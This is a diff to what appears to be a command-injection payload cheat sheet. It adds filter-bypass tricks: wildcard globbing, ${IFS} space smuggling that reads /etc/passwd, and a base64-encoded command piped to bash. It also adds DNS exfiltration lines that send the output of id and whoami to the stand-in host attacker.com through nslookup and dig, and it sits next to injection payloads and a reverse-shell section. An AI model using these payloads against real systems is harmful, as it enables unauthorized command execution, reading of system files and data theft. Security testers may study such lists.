@@ -114,6 +114,29 @@ $(id)
 # IP whitelist bypass
 127.0.0.1;id
 localhost|id
+
+### Advanced Filter Bypasses
+```bash
+# [NEW] Globbing / Wildcard Bypasses (bypass string blacklists like "cat")
+/bin/c?t /etc/p?sswd
+/usr/bin/w??ami
+
+# [NEW] Environment Variable Smuggling
+# Bypass space filters with ${IFS}
+cat${IFS}/etc/passwd
+
+# [NEW] Base64 execution (bypass keyword filters)
+echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
+```
+
+### Out-of-Bound (OOB) DNS Exfiltration
+*Used when HTTP/ICMP is blocked but DNS is open.*
+```bash
+# nslookup exfiltration
+; nslookup $(id|base64).attacker.com
+
+# dig exfiltration
+; dig $(whoami).attacker.com
 ```
 
 ### Reverse Shell (after RCE confirmation)
